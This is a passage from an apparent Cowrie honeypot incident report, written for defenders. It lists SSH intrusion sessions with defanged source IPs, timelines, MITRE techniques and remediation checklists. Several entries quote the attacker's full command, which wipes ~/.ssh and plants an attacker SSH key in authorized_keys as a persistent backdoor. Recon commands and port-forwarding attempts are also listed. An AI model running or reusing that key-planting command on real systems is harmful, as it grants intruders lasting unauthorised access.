| **Commands Executed** | `/ip cloud print, ifconfig, uname -a, cat /proc/cpuinfo, ps | grep '[Mm]iner'` |
| **TTPs (MITRE)** | T1057 · T1078 · T1083 · T1110.001 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 07:09:13` | `cowrie.session.connect` |
| `2026-07-22 07:09:13` | `cowrie.client.version` |
| `2026-07-22 07:09:13` | `cowrie.client.kex` |
| `2026-07-22 07:09:16` | `cowrie.login.failed` |
| `2026-07-22 07:09:17` | `cowrie.login.success` |
| `2026-07-22 07:09:18` | `cowrie.session.params` |
| `2026-07-22 07:09:18` | `cowrie.command.input` |
| `2026-07-22 07:09:18` | `cowrie.command.failed` |
| `2026-07-22 07:09:19` | `cowrie.log.closed` |
| `2026-07-22 07:09:20` | `cowrie.session.params` |
| `2026-07-22 07:09:20` | `cowrie.command.input` |
| `2026-07-22 07:09:20` | `cowrie.log.closed` |
| `2026-07-22 07:09:21` | `cowrie.session.params` |
| `2026-07-22 07:09:21` | `cowrie.command.input` |
| `2026-07-22 07:09:22` | `cowrie.log.closed` |
| `2026-07-22 07:09:23` | `cowrie.session.params` |
| `2026-07-22 07:09:23` | `cowrie.command.input` |
| `2026-07-22 07:09:23` | `cowrie.log.closed` |
| `2026-07-22 07:09:24` | `cowrie.session.params` |
| `2026-07-22 07:09:24` | `cowrie.command.input` |
| `2026-07-22 07:09:25` | `cowrie.log.closed` |
| `2026-07-22 07:09:26` | `cowrie.session.params` |
| `2026-07-22 07:09:26` | `cowrie.command.input` |
| `2026-07-22 07:09:26` | `cowrie.log.closed` |
| `2026-07-22 07:09:28` | `cowrie.session.params` |
| `2026-07-22 07:09:28` | `cowrie.command.input` |
| `2026-07-22 07:09:28` | `cowrie.log.closed` |
| `2026-07-22 07:09:29` | `cowrie.session.params` |
| `2026-07-22 07:09:29` | `cowrie.command.input` |
| `2026-07-22 07:09:29` | `cowrie.log.closed` |
| `2026-07-22 07:09:31` | `cowrie.session.params` |
| `2026-07-22 07:09:31` | `cowrie.command.input` |
| `2026-07-22 07:09:31` | `cowrie.log.closed` |
| `2026-07-22 07:10:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.150.140[.]229` to AbuseIPDB if not already reported
- [ ] Block `203.150.140[.]229` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7e5995088293

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-22 07:12 |
| **Last Seen** | 2026-07-22 07:12 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 07:12:31` | `cowrie.session.connect` |
| `2026-07-22 07:12:31` | `cowrie.client.version` |
| `2026-07-22 07:12:32` | `cowrie.client.kex` |
| `2026-07-22 07:12:32` | `cowrie.login.success` |
| `2026-07-22 07:12:32` | `cowrie.direct-tcpip.request` |
| `2026-07-22 07:12:32` | `cowrie.direct-tcpip.data` |
| `2026-07-22 07:12:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-598576b3fd7b

| Field | Detail |
|---|---|
| **Source IP** | `115.191.38[.]87` |
| **First Seen** | 2026-07-22 07:13 |
| **Last Seen** | 2026-07-22 07:13 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 07:13:01` | `cowrie.session.connect` |
| `2026-07-22 07:13:01` | `cowrie.client.version` |
| `2026-07-22 07:13:02` | `cowrie.client.kex` |
| `2026-07-22 07:13:03` | `cowrie.login.success` |
| `2026-07-22 07:13:04` | `cowrie.session.params` |
| `2026-07-22 07:13:04` | `cowrie.command.input` |
| `2026-07-22 07:13:04` | `cowrie.command.failed` |
| `2026-07-22 07:13:06` | `cowrie.log.closed` |
| `2026-07-22 07:13:07` | `cowrie.session.params` |
| `2026-07-22 07:13:07` | `cowrie.command.input` |
| `2026-07-22 07:13:07` | `cowrie.session.file_download` |
| `2026-07-22 07:13:07` | `cowrie.log.closed` |
| `2026-07-22 07:13:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.191.38[.]87` to AbuseIPDB if not already reported
- [ ] Block `115.191.38[.]87` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-76fcc4dae245

| Field | Detail |
|---|---|
| **Source IP** | `115.191.38[.]87` |
| **First Seen** | 2026-07-22 07:13 |
| **Last Seen** | 2026-07-22 07:13 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 07:13:07` | `cowrie.session.connect` |
| `2026-07-22 07:13:07` | `cowrie.client.version` |
| `2026-07-22 07:13:07` | `cowrie.client.kex` |
| `2026-07-22 07:13:09` | `cowrie.login.success` |
| `2026-07-22 07:13:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.191.38[.]87` to AbuseIPDB if not already reported
- [ ] Block `115.191.38[.]87` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-73d0752d9328

| Field | Detail |
|---|---|
| **Source IP** | `115.191.38[.]87` |
| **First Seen** | 2026-07-22 07:13 |
| **Last Seen** | 2026-07-22 07:13 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 07:13:10` | `cowrie.session.connect` |
| `2026-07-22 07:13:10` | `cowrie.client.version` |
| `2026-07-22 07:13:11` | `cowrie.client.kex` |
| `2026-07-22 07:13:13` | `cowrie.login.success` |
| `2026-07-22 07:13:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.191.38[.]87` to AbuseIPDB if not already reported
- [ ] Block `115.191.38[.]87` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-af61eed40fd8

| Field | Detail |
|---|---|
| **Source IP** | `181.233.140[.]250` |
| **First Seen** | 2026-07-22 07:14 |
| **Last Seen** | 2026-07-22 07:14 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 07:14:10` | `cowrie.session.connect` |
| `2026-07-22 07:14:11` | `cowrie.client.version` |
| `2026-07-22 07:14:11` | `cowrie.client.kex` |
| `2026-07-22 07:14:13` | `cowrie.login.success` |
| `2026-07-22 07:14:13` | `cowrie.direct-tcpip.request` |
| `2026-07-22 07:14:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `181.233.140[.]250` to AbuseIPDB if not already reported
- [ ] Block `181.233.140[.]250` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5ca1110ec168

| Field | Detail |
|---|---|
| **Source IP** | `182.151.45[.]136` |
| **First Seen** | 2026-07-22 07:14 |
| **Last Seen** | 2026-07-22 07:14 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 07:14:18` | `cowrie.session.connect` |
| `2026-07-22 07:14:19` | `cowrie.client.version` |
| `2026-07-22 07:14:19` | `cowrie.client.kex` |
| `2026-07-22 07:14:21` | `cowrie.login.success` |
| `2026-07-22 07:14:22` | `cowrie.direct-tcpip.request` |
| `2026-07-22 07:14:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.151.45[.]136` to AbuseIPDB if not already reported
- [ ] Block `182.151.45[.]136` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a0f54b251559

| Field | Detail |
|---|---|
| **Source IP** | `172.214.209[.]153` |
| **First Seen** | 2026-07-22 07:14 |
| **Last Seen** | 2026-07-22 07:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 07:14:29` | `cowrie.session.connect` |
| `2026-07-22 07:14:29` | `cowrie.client.version` |
| `2026-07-22 07:14:29` | `cowrie.client.kex` |
| `2026-07-22 07:14:29` | `cowrie.login.success` |
| `2026-07-22 07:14:30` | `cowrie.session.params` |
| `2026-07-22 07:14:30` | `cowrie.command.input` |
| `2026-07-22 07:14:30` | `cowrie.command.failed` |
| `2026-07-22 07:14:30` | `cowrie.log.closed` |
| `2026-07-22 07:14:31` | `cowrie.session.params` |
| `2026-07-22 07:14:31` | `cowrie.command.input` |
| `2026-07-22 07:14:31` | `cowrie.session.file_download` |
| `2026-07-22 07:14:31` | `cowrie.log.closed` |
| `2026-07-22 07:14:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.214.209[.]153` to AbuseIPDB if not already reported
- [ ] Block `172.214.209[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9de71f927b6b

| Field | Detail |
|---|---|
| **Source IP** | `172.214.209[.]153` |
| **First Seen** | 2026-07-22 07:14 |
| **Last Seen** | 2026-07-22 07:14 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 07:14:31` | `cowrie.session.connect` |
| `2026-07-22 07:14:31` | `cowrie.client.version` |
| `2026-07-22 07:14:31` | `cowrie.client.kex` |
| `2026-07-22 07:14:31` | `cowrie.login.success` |
| `2026-07-22 07:14:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.214.209[.]153` to AbuseIPDB if not already reported
- [ ] Block `172.214.209[.]153` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6eafe9df29cd

| Field | Detail |
|---|---|
| **Source IP** | `172.214.209[.]153` |
| **First Seen** | 2026-07-22 07:14 |
| **Last Seen** | 2026-07-22 07:14 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 07:14:31` | `cowrie.session.connect` |
| `2026-07-22 07:14:31` | `cowrie.client.version` |
| `2026-07-22 07:14:31` | `cowrie.client.kex` |
| `2026-07-22 07:14:31` | `cowrie.login.success` |
| `2026-07-22 07:14:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.214.209[.]153` to AbuseIPDB if not already reported
- [ ] Block `172.214.209[.]153` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3001e7f7526e

| Field | Detail |
|---|---|
| **Source IP** | `20.228.193[.]165` |
| **First Seen** | 2026-07-22 07:16 |
| **Last Seen** | 2026-07-22 07:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 07:16:19` | `cowrie.session.connect` |
| `2026-07-22 07:16:19` | `cowrie.client.version` |
| `2026-07-22 07:16:19` | `cowrie.client.kex` |
| `2026-07-22 07:16:20` | `cowrie.login.success` |
| `2026-07-22 07:16:20` | `cowrie.session.params` |
| `2026-07-22 07:16:20` | `cowrie.command.input` |
| `2026-07-22 07:16:20` | `cowrie.command.failed` |
| `2026-07-22 07:16:20` | `cowrie.log.closed` |
| `2026-07-22 07:16:21` | `cowrie.session.params` |
| `2026-07-22 07:16:21` | `cowrie.command.input` |
| `2026-07-22 07:16:21` | `cowrie.session.file_download` |
| `2026-07-22 07:16:21` | `cowrie.log.closed` |
| `2026-07-22 07:16:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.228.193[.]165` to AbuseIPDB if not already reported
- [ ] Block `20.228.193[.]165` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9f4023d1eba7

| Field | Detail |
|---|---|
| **Source IP** | `20.228.193[.]165` |
| **First Seen** | 2026-07-22 07:16 |
| **Last Seen** | 2026-07-22 07:16 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 07:16:21` | `cowrie.session.connect` |
| `2026-07-22 07:16:21` | `cowrie.client.version` |
| `2026-07-22 07:16:21` | `cowrie.client.kex` |
| `2026-07-22 07:16:21` | `cowrie.login.success` |
| `2026-07-22 07:16:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.228.193[.]165` to AbuseIPDB if not already reported
- [ ] Block `20.228.193[.]165` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-54592ae7e29d

| Field | Detail |
|---|---|
| **Source IP** | `20.228.193[.]165` |
| **First Seen** | 2026-07-22 07:16 |
| **Last Seen** | 2026-07-22 07:16 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 07:16:21` | `cowrie.session.connect` |
| `2026-07-22 07:16:21` | `cowrie.client.version` |
| `2026-07-22 07:16:21` | `cowrie.client.kex` |
| `2026-07-22 07:16:21` | `cowrie.login.success` |
| `2026-07-22 07:16:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.228.193[.]165` to AbuseIPDB if not already reported
- [ ] Block `20.228.193[.]165` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a729a720461b

| Field | Detail |
|---|---|
| **Source IP** | `203.252.10[.]3` |
| **First Seen** | 2026-07-22 07:17 |
| **Last Seen** | 2026-07-22 07:17 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 07:17:33` | `cowrie.session.connect` |
| `2026-07-22 07:17:34` | `cowrie.client.version` |
| `2026-07-22 07:17:34` | `cowrie.client.kex` |
| `2026-07-22 07:17:36` | `cowrie.login.success` |
| `2026-07-22 07:17:37` | `cowrie.direct-tcpip.request` |
| `2026-07-22 07:17:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.252.10[.]3` to AbuseIPDB if not already reported
- [ ] Block `203.252.10[.]3` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-733a0f996554

| Field | Detail |
|---|---|
| **Source IP** | `188.168.86[.]6` |
| **First Seen** | 2026-07-22 07:17 |
| **Last Seen** | 2026-07-22 07:17 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 07:17:42` | `cowrie.session.connect` |
| `2026-07-22 07:17:43` | `cowrie.client.version` |
| `2026-07-22 07:17:43` | `cowrie.client.kex` |
| `2026-07-22 07:17:44` | `cowrie.login.success` |
| `2026-07-22 07:17:45` | `cowrie.direct-tcpip.request` |
| `2026-07-22 07:17:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `188.168.86[.]6` to AbuseIPDB if not already reported
- [ ] Block `188.168.86[.]6` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-85e55c8c50ab

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-22 07:21 |
| **Last Seen** | 2026-07-22 07:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 07:21:16` | `cowrie.session.connect` |
| `2026-07-22 07:21:16` | `cowrie.client.version` |
| `2026-07-22 07:21:16` | `cowrie.client.kex` |
| `2026-07-22 07:21:16` | `cowrie.login.success` |
| `2026-07-22 07:21:17` | `cowrie.session.params` |
| `2026-07-22 07:21:17` | `cowrie.command.input` |
| `2026-07-22 07:21:17` | `cowrie.log.closed` |
| `2026-07-22 07:21:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-649349b67fa0

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-22 07:29 |
| **Last Seen** | 2026-07-22 07:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 07:29:03` | `cowrie.session.connect` |
| `2026-07-22 07:29:03` | `cowrie.client.version` |
| `2026-07-22 07:29:03` | `cowrie.client.kex` |
| `2026-07-22 07:29:03` | `cowrie.login.success` |
| `2026-07-22 07:29:04` | `cowrie.session.params` |
| `2026-07-22 07:29:04` | `cowrie.command.input` |
| `2026-07-22 07:29:04` | `cowrie.log.closed` |
| `2026-07-22 07:29:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-be9858563698

| Field | Detail |
|---|---|
| **Source IP** | `61.37.150[.]6` |
| **First Seen** | 2026-07-22 07:29 |
| **Last Seen** | 2026-07-22 07:29 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 07:29:05` | `cowrie.session.connect` |
| `2026-07-22 07:29:06` | `cowrie.client.version` |
| `2026-07-22 07:29:06` | `cowrie.client.kex` |
| `2026-07-22 07:29:08` | `cowrie.login.success` |
| `2026-07-22 07:29:08` | `cowrie.direct-tcpip.request` |
| `2026-07-22 07:29:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.37.150[.]6` to AbuseIPDB if not already reported
- [ ] Block `61.37.150[.]6` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d418d866dd8

| Field | Detail |
|---|---|
| **Source IP** | `202.72.196[.]75` |
| **First Seen** | 2026-07-22 07:29 |
| **Last Seen** | 2026-07-22 07:34 |
| **Session Duration** | 302s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 07:29:14` | `cowrie.session.connect` |
| `2026-07-22 07:29:15` | `cowrie.client.version` |
| `2026-07-22 07:29:15` | `cowrie.client.kex` |
| `2026-07-22 07:29:16` | `cowrie.login.success` |
| `2026-07-22 07:29:17` | `cowrie.direct-tcpip.request` |
| `2026-07-22 07:34:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.72.196[.]75` to AbuseIPDB if not already reported
- [ ] Block `202.72.196[.]75` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-39cda7f405f5

| Field | Detail |
|---|---|
| **Source IP** | `185.112.148[.]66` |
| **First Seen** | 2026-07-22 07:30 |
| **Last Seen** | 2026-07-22 07:30 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 07:30:00` | `cowrie.session.connect` |
| `2026-07-22 07:30:01` | `cowrie.client.version` |
| `2026-07-22 07:30:01` | `cowrie.client.kex` |
| `2026-07-22 07:30:02` | `cowrie.login.success` |
| `2026-07-22 07:30:03` | `cowrie.direct-tcpip.request` |
| `2026-07-22 07:30:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.112.148[.]66` to AbuseIPDB if not already reported
- [ ] Block `185.112.148[.]66` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-891cc3385624

| Field | Detail |
|---|---|
| **Source IP** | `115.241.228[.]34` |
| **First Seen** | 2026-07-22 07:30 |
| **Last Seen** | 2026-07-22 07:30 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 07:30:09` | `cowrie.session.connect` |
| `2026-07-22 07:30:10` | `cowrie.client.version` |
| `2026-07-22 07:30:10` | `cowrie.client.kex` |
| `2026-07-22 07:30:13` | `cowrie.login.success` |
| `2026-07-22 07:30:13` | `cowrie.direct-tcpip.request` |
| `2026-07-22 07:30:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.241.228[.]34` to AbuseIPDB if not already reported
- [ ] Block `115.241.228[.]34` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2f513edfc502

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]137` |
| **First Seen** | 2026-07-22 07:31 |
| **Last Seen** | 2026-07-22 07:31 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 07:31:05` | `cowrie.session.connect` |
| `2026-07-22 07:31:05` | `cowrie.client.version` |
| `2026-07-22 07:31:05` | `cowrie.client.kex` |
| `2026-07-22 07:31:06` | `cowrie.login.success` |
| `2026-07-22 07:31:06` | `cowrie.direct-tcpip.request` |
| `2026-07-22 07:31:06` | `cowrie.direct-tcpip.ja4` |
| `2026-07-22 07:31:06` | `cowrie.direct-tcpip.data` |
| `2026-07-22 07:31:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]137` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]137` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a701d03f690b

| Field | Detail |
|---|---|
| **Source IP** | `49.206.194[.]29` |
